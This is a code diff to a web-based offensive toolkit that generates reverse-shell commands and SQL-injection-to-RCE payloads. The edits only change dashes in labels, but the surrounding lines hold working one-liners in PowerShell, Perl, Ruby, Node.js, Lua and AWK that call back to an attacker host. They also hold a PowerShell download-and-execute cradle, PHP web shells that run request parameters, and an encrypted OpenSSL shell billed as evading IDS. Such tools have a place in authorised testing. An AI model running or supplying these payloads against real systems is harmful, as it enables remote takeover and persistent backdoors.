     const psCmdStr = `$c=New-Object Net.Sockets.TCPClient("${H}",${P});$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length))-ne 0){$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);$sb=(iex $d 2>&1|Out-String);$sb2=$sb+"PS "+(pwd).Path+"> ";$sbt=([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush();}`;
     cards.push({
-      id:'sh-penelope', title:'Penelope-style — printf|base64 -d|shell (all variants)',
+      id:'sh-penelope', title:'Penelope-style - printf|base64 -d|shell (all variants)',
       platform: 'both',
       note: `Penelope listener: python3 penelope.py ${P}  OR  rlwrap nc -lvnp ${P}`,
       variants: [
@@ -2930,7 +2930,7 @@ function buildShells(ip, port, hp, shells, webshells) {
   // ── NETCAT ────────────────────────────────────────────
   if (shells.includes('nc')) {
     cards.push({
-      id:'sh-nc', title:'Netcat — all variants (traditional, openbsd, busybox, ncat)',
+      id:'sh-nc', title:'Netcat - all variants (traditional, openbsd, busybox, ncat)',
       platform: 'both',
       note: `Listener: nc -lvnp ${P}  OR  rlwrap nc -lvnp ${P}  (rlwrap = arrow key support)`,
       variants: [
@@ -2949,7 +2949,7 @@ function buildShells(ip, port, hp, shells, webshells) {
   // ── SOCAT ─────────────────────────────────────────────
   if (shells.includes('socat')) {
     cards.push({
-      id:'sh-socat', title:'Socat — fully interactive TTY (best shell quality)',
+      id:'sh-socat', title:'Socat - fully interactive TTY (best shell quality)',
       platform: 'linux',
       note: `Listener: socat file:\`tty\`,raw,echo=0 TCP-LISTEN:${P}  ← gives REAL TTY with tab complete`,
       variants: [
@@ -2964,11 +2964,11 @@ function buildShells(ip, port, hp, shells, webshells) {
 
   // ── POWERSHELL (all variants) ─────────────────────────
   if (true) {
-    // always include PS — it's Windows-universal regardless of chip selection
+    // always include PS - it's Windows-universal regardless of chip selection
     const psCmdStr = `$c=New-Object Net.Sockets.TCPClient("${H}",${P});$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length))-ne 0){$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);$sb=(iex $d 2>&1|Out-String);$sb2=$sb+"PS "+(pwd).Path+"> ";$sbt=([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush();}`;
     const iexCradle= `IEX(New-Object Net.WebClient).DownloadString('http://${H}:${HP}/s.ps1')`;
     cards.push({
-      id:'sh-ps', title:'PowerShell — TCP rev shell (all formats)',
+      id:'sh-ps', title:'PowerShell - TCP rev shell (all formats)',
       platform: 'win',
       note: `Listener: nc -lvnp ${P}  |  File server (serve s.ps1/nc.exe): python3 -m http.server ${HP}`,
       variants: [
@@ -2985,7 +2985,7 @@ function buildShells(ip, port, hp, shells, webshells) {
   // ── PYTHON ────────────────────────────────────────────
   if (shells.includes('python')) {
     cards.push({
-      id:'sh-python', title:'Python — reverse shell (2 + 3)',
+      id:'sh-python', title:'Python - reverse shell (2 + 3)',
       platform: 'both',
       note: `nc -lvnp ${P}`,
       variants: [
@@ -3003,7 +3003,7 @@ function buildShells(ip, port, hp, shells, webshells) {
   if (shells.includes('perl')) {
     const raw = `perl -e 'use Socket;$i="${H}";$p=${P};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'`;
     cards.push({
-      id:'sh-perl', title:'Perl — reverse shell',
+      id:'sh-perl', title:'Perl - reverse shell',
       platform: 'both',
       note: `nc -lvnp ${P}`,
       variants: [
@@ -3019,7 +3019,7 @@ function buildShells(ip, port, hp, shells, webshells) {
   if (shells.includes('ruby')) {
     const raw = `ruby -rsocket -e 'exit if fork;c=TCPSocket.new("${H}","${P}");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'`;
     cards.push({
-      id:'sh-ruby', title:'Ruby — reverse shell',
+      id:'sh-ruby', title:'Ruby - reverse shell',
       platform: 'both',
       note: `nc -lvnp ${P}`,
       variants: [
@@ -3033,7 +3033,7 @@ function buildShells(ip, port, hp, shells, webshells) {
   // ── PHP ───────────────────────────────────────────────
   if (shells.includes('php')) {
     cards.push({
-      id:'sh-php', title:'PHP — reverse shell (exec variants)',
+      id:'sh-php', title:'PHP - reverse shell (exec variants)',
       platform: 'linux',
       note: `nc -lvnp ${P}`,
       variants: [
@@ -3050,7 +3050,7 @@ function buildShells(ip, port, hp, shells, webshells) {
   if (shells.includes('nodejs')) {
     const raw = `node -e "(function(){var net=require('net'),cp=require('child_process'),sh=cp.spawn('/bin/sh',[]);var c=new net.Socket();c.connect(${P},'${H}',function(){c.pipe(sh.stdin);sh.stdout.pipe(c);sh.stderr.pipe(c);});})()"`;
     cards.push({
-      id:'sh-node', title:'Node.js — reverse shell',
+      id:'sh-node', title:'Node.js - reverse shell',
       platform: 'both',
       note: `nc -lvnp ${P}`,
       variants: [
@@ -3063,7 +3063,7 @@ function buildShells(ip, port, hp, shells, webshells) {
   // ── GROOVY (Jenkins) ──────────────────────────────────
   if (shells.includes('groovy')) {
     cards.push({
-      id:'sh-groovy', title:'Groovy — reverse shell (Jenkins Script Console)',
+      id:'sh-groovy', title:'Groovy - reverse shell (Jenkins Script Console)',
       platform: 'both',
       note: `Jenkins → Manage → Script Console. nc -lvnp ${P}`,
       variants: [
@@ -3077,7 +3077,7 @@ function buildShells(ip, port, hp, shells, webshells) {
   if (shells.includes('lua')) {
     const raw = `lua -e "require('socket');require('os');t=socket.tcp();t:connect('${H}','${P}');os.execute('/bin/sh -i <&3 >&3 2>&3');"`;
     cards.push({
-      id:'sh-lua', title:'Lua — reverse shell',
+      id:'sh-lua', title:'Lua - reverse shell',
       platform: 'linux',
       note: `nc -lvnp ${P}. Requires luasocket (lua-socket pkg).`,
       variants: [
@@ -3090,7 +3090,7 @@ function buildShells(ip, port, hp, shells, webshells) {
   // ── GO ────────────────────────────────────────────────
   if (shells.includes('golang')) {
     cards.push({
-      id:'sh-go', title:'Go — reverse shell (compile on target or pre-compile)',
+      id:'sh-go', title:'Go - reverse shell (compile on target or pre-compile)',
       platform: 'both',
       note: `Cross-compile: GOOS=linux GOARCH=amd64 go build -o shell shell.go`,
       variants: [
@@ -3103,7 +3103,7 @@ function buildShells(ip, port, hp, shells, webshells) {
   // ── OPENSSL encrypted shell ───────────────────────────
   if (shells.includes('openssl')) {
     cards.push({
-      id:'sh-openssl', title:'OpenSSL — encrypted reverse shell (evades IDS)',
+      id:'sh-openssl', title:'OpenSSL - encrypted reverse shell (evades IDS)',
       platform: 'linux',
       note: `Listener on Kali first:\nopenssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes -subj '/CN=srv'\nopenssl s_server -quiet -key key.pem -cert cert.pem -port ${P}`,
       variants: [
@@ -3117,7 +3117,7 @@ function buildShells(ip, port, hp, shells, webshells) {
   if (shells.includes('awk')) {
     const raw = `awk 'BEGIN{s="/inet/tcp/0/${H}/${P}";while(1){do{printf"shell>" |& s;s |& getline c;if(c){while((c |& getline)>0)print|&s;close(c)}}while(c!="exit");close(s)}}'`;
     cards.push({
-      id:'sh-awk', title:'AWK — reverse shell (GAWK only)',
+      id:'sh-awk', title:'AWK - reverse shell (GAWK only)',
       platform: 'linux',
       note: `Requires gawk (GNU awk). nc -lvnp ${P}`,
       variants: [
@@ -3134,7 +3134,7 @@ function buildShells(ip, port, hp, shells, webshells) {
       platform: 'linux',
       note: "Deploy via MySQL INTO OUTFILE, PostgreSQL lo_export, xp_cmdshell echo redirect, or any file write primitive.",
       variants: [
-        { label:'system($_REQUEST)  — simplest',  cmd: `<?php system($_REQUEST['c']);?>` },
+        { label:'system($_REQUEST)  - simplest',  cmd: `<?php system($_REQUEST['c']);?>` },
         { label:'passthru (less filtered)',        cmd: `<?php passthru($_GET['c']);?>` },
         { label:'shell_exec (string return)',      cmd: `<?php echo shell_exec($_GET['c']);?>` },
         { label:'exec (array)',                    cmd: `<?php exec($_GET['c'],$o);echo implode("\\n",$o);?>` },
@@ -3218,7 +3218,7 @@ function buildShells(ip, port, hp, shells, webshells) {
 }
 
 // ═══════════════════════════════════════════════════════
-// REVSHELLS VIEW — SQLi → revshell delivery payloads
+// REVSHELLS VIEW - SQLi → revshell delivery payloads
 // ═══════════════════════════════════════════════════════
 function renderRevShells() {
   const ip    = document.getElementById('ip').value.trim();
@@ -3258,7 +3258,7 @@ function renderRevShells() {
   let html = '<div class="chain-panel">';
   html += `<div class="chain-banner">
     <div class="chain-banner-title">🐚 SQLi → RevShell Payload Bank</div>
-    <div class="chain-banner-sub">All DBs · RCE only · LHOST: <b>${ip ? escHtml(ip) : '<span style="color:var(--red)">NOT SET — set LHOST above</span>'}</b> · LPORT: <b>${escHtml(port)}</b> · HTTP: <b>${escHtml(hp)}</b> · <b>${allLines.length}</b> Intruder lines total</div>
+    <div class="chain-banner-sub">All DBs · RCE only · LHOST: <b>${ip ? escHtml(ip) : '<span style="color:var(--red)">NOT SET - set LHOST above</span>'}</b> · LPORT: <b>${escHtml(port)}</b> · HTTP: <b>${escHtml(hp)}</b> · <b>${allLines.length}</b> Intruder lines total</div>
   </div>`;
 
   html += `<div style="display:flex;gap:8px;align-items:center;flex-wrap:wrap;padding:4px 0">
@@ -3271,7 +3271,7 @@ function renderRevShells() {
     if (!ps.length) return;
 
     html += `<div class="chain-section">
-      <div class="chain-section-label">${dbLabels[db]} — ${ps.length} payload${ps.length !== 1 ? 's' : ''}</div>`;
+      <div class="chain-section-label">${dbLabels[db]} - ${ps.length} payload${ps.length !== 1 ? 's' : ''}</div>`;
 
     ps.forEach(p => {
       const raw = typeof p.payload === 'function' ? p.payload(ip || 'LHOST', port) : p.payload;
@@ -3295,7 +3295,7 @@ function renderRevShells() {
   });
 
   if (!allLines.length) {
-    html += '<div class="no-results">No RCE payloads generated — set LHOST and check DB selection.</div>';
+    html += '<div class="no-results">No RCE payloads generated - set LHOST and check DB selection.</div>';
   }
 
   html += '</div>';
@@ -3431,7 +3431,7 @@ function highlightShell(raw, ip, port) {
     code = code.replace(/\b(bash|sh|python3|python|python2|perl|ruby|php|node|lua|awk|socat|nc|ncat|openssl|powershell|cmd\.exe|cmd|curl|wget|printf|base64|mkfifo|rm|cat|exec)\b/g,
       m => `<span class="sk">${m}</span>`);
 
-    // double-quoted strings — safe since we already escaped HTML
+    // double-quoted strings - safe since we already escaped HTML
     code = code.replace(/"[^"<>\n]*"/g, m => `<span class="ss">${m}</span>`);
 
     // base64 blobs (long alphanum strings)
@@ -3461,7 +3461,7 @@ function copySh(id, btn) {
 }
 </script>
 <footer style="text-align:center;padding:1.5rem;border-top:1px solid var(--mah-border);color:var(--mah-text-secondary);font-size:0.75rem;font-family:'JetBrains Mono',monospace;margin-top:2rem;">
-  Built with <span style="color:#f87171;">&hearts;</span> by Mahdiesta — Offensive Security Toolkit
+  Built with <span style="color:#f87171;">&hearts;</span> by Mahdiesta - Offensive Security Toolkit
 </footer>
 
 </body>
